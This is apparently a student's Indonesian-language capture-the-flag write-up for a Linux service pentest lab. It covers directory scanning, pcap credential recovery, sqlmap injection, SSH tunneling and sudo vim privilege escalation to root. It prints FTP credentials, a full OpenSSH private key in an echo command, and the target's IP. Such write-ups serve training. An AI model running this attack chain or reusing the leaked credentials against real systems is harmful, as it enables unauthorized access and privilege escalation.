# Write-Up: Cyber Academy - Linux Service Pentesting
Target IP: 34.142.169.86 Solved By: Hafizh Azrial/Kelompok 2

## Pendahuluan
Tantangan ini menguji kemampuan Network Services Pentesting yang mencakup fase reconnaissance, analisis forensik jaringan, eksploitasi web (SQL Injection), teknik SSH Tunneling, hingga eskalasi hak akses (Privilege Escalation) untuk mendapatkan akses root.

## Phase 1 & 2: Reconnaissance & Forensics
### 1. Port Scanning & Enumerasi Web
Langkah pertama adalah melakukan pemindaian port menggunakan Nmap. Hasil menunjukkan Port 80 (HTTP) terbuka. Karena halaman utama statis, dilakukan enumerasi direktori menggunakan Gobuster.

**gobuster dir -u http://34.142.169.86 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt**

Temuan: Ditemukan direktori tersembunyi /pcap.

### 2. Network Traffic Analysis
Di dalam direktori /pcap, terdapat file suspicioustraffic.pcap. File ini diunduh dan dianalisis menggunakan Wireshark.

Analisis: Memfilter trafik FTP (ftp atau tcp.stream eq <index>).

Temuan: Ditemukan kredensial plain-text yang bocor dalam paket jaringan:

**User: apanihftp
Pass: akucintacps**

### 3. Enumerasi FTP & Hint
Menggunakan kredensial tersebut, akses dilakukan ke layanan FTP target.

**ftp 34.142.169.86**

Di dalam FTP server, ditemukan file hint.txt milik user root. 

**Isi Hint: "Server Error. Cek database di /product.php?id=1"**

## Phase 3: Web Exploitation (SQL Injection)
Berdasarkan hint, terdapat kerentanan SQL Injection pada parameter id. Eksploitasi dilakukan menggunakan SQLMap untuk mengekstrak data sensitif dari database.

### 1. Ekstraksi Database
**sqlmap -u "http://34.142.169.86/product.php?id=1" --dbs
Target database teridentifikasi sebagai ctf_db.**

### 2. Dumping Tabel Users
Setelah melakukan enumerasi tabel (users) dan kolom, dilakukan dumping data untuk mendapatkan kredensial SSH.

**sqlmap -u "http://34.142.169.86/product.php?id=1" -D ctf_db -T users -C username,ssh_key --dump**

Hasil:

Username: cyberacademy
SSH Key: (Sebuah RSA Private Key yang formatnya berantakan/satu baris).

## Phase 4: Network Security (User Flag) - "Hidden Tunnel"
Untuk masuk ke server, kita memerlukan SSH Key yang didapat dari SQLMap. Namun, format key tersebut rusak (berupa satu baris dengan karakter \n literal).

### 1. Perbaikan Format SSH Key (Critical Step)
Agar key dapat digunakan, kita harus memformat ulang header, body, dan footer-nya. Perintah berikut memperbaiki format tersebut secara instan:

**echo -e '-----BEGIN OPENSSH PRIVATE KEY-----\n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\nZWbgnf1oYR09kAAAALcm9vdEBuZXRzZWM=\n-----END OPENSSH PRIVATE KEY-----' > id_rsa && chmod 600 id_rsa**

### 2. SSH Tunneling
Setelah masuk, file user_flag.txt menyatakan bahwa flag sebenarnya berada di server internal (127.0.0.1:8080) yang diblokir firewall. Teknik Local Port Forwarding digunakan untuk mengaksesnya.

**ssh -i id_rsa -L 9090:127.0.0.1:8080 cyberacademy@34.142.169.86**

Setelah tunnel terbentuk, akses browser ke http://localhost:9090 menampilkan Flag 1: Hidden Tunnel.

## Phase 5: Privilege Escalation (Root Flag) - "The Escalation"
Langkah terakhir adalah mendapatkan akses root. Pengecekan dilakukan menggunakan sudo -l untuk melihat perintah apa yang bisa dijalankan user cyberacademy sebagai root tanpa password.

**sudo -l**

Output sudo -l:**(ALL) NOPASSWD: /usr/bin/vim**

### 1. Eksploitasi Vim Sudo
Binary vim dapat digunakan untuk memanggil shell sistem. Karena dijalankan dengan sudo, shell yang terpanggil akan memiliki akses root.

**sudo vim -c ':!/bin/sh'**

### 2. Capture Root Flag
Akses shell root berhasil didapatkan (uid=0(root)). Flag terakhir ditemukan di direktori root.

**cat /root/root_flag.txt**
